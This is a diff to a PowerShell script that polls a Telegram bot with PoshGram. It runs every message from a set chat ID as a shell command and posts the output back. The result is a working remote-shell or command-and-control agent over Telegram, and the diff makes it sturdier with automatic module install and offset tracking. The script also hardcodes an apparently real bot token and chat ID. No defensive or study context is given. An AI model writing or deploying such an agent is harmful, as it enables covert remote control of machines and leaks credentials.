@@ -1,9 +1,29 @@
-# Install-Module -Name PoshGram -Scope CurrentUser
-Import-Module PoshGram
+# Ensure PoshGram is installed
+if (-not (Get-Module -ListAvailable -Name PoshGram)) {
+    try {
+        Install-Module -Name PoshGram -Scope CurrentUser -Force -ErrorAction Stop
+        Write-Host "PoshGram module installed successfully."
+    }
+    catch {
+        Write-Error "Failed to install PoshGram module: $_"
+        exit
+    }
+}
 
-$BOT_TOKEN = "8273212830:AAHdcO2H9nH_HHkwV0rVprnClLsUo56ZPYE"
-$CHAT_ID = "5681247685"
+# Import PoshGram module
+try {
+    Import-Module PoshGram -ErrorAction Stop
+}
+catch {
+    Write-Error "Failed to import PoshGram module: $_"
+    exit
+}
 
+# Telegram Bot Token and Chat ID
+$BOT_TOKEN = "8273212830:AAHdcO2H9nH_HHkwV0rVprnClLsUo56ZPYE"  # Replace with your Telegram Bot Token
+$CHAT_ID = "5681247685"      # Replace with your Telegram Chat ID
+
+# Function to execute commands
 function Execute-Command {
     param (
         [string]$Command
@@ -17,6 +37,7 @@ function Execute-Command {
     }
 }
 
+# Function to send message to Telegram
 function Send-TelegramMessage {
     param (
         [string]$Message
@@ -29,22 +50,33 @@ function Send-TelegramMessage {
     }
 }
 
+# Main loop to poll for new messages
+$offset = 0
 while ($true) {
     try {
-        $updates = Get-TelegramUpdate -BotToken $BOT_TOKEN
+        # Get updates from Telegram
+        $updates = Get-TelegramUpdate -BotToken $BOT_TOKEN -Offset $offset
+
         foreach ($update in $updates.result) {
             if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
                 $command = $update.message.text
                 $message_id = $update.message.message_id
+
+                # Execute the command and get output
                 $output = Execute-Command -Command $command
+
+                # Send the output back to Telegram
                 Send-TelegramMessage -Message "Command: $command`nOutput:`n$output"
+
+                # Update offset to mark message as processed
                 $offset = $update.update_id + 1
-                Update-TelegramOffset -BotToken $BOT_TOKEN -Offset $offset
             }
         }
     }
     catch {
         Write-Error "Error in main loop: $_"
     }
+
+    # Wait before polling again to avoid rate limits
     Start-Sleep -Seconds 2
 }
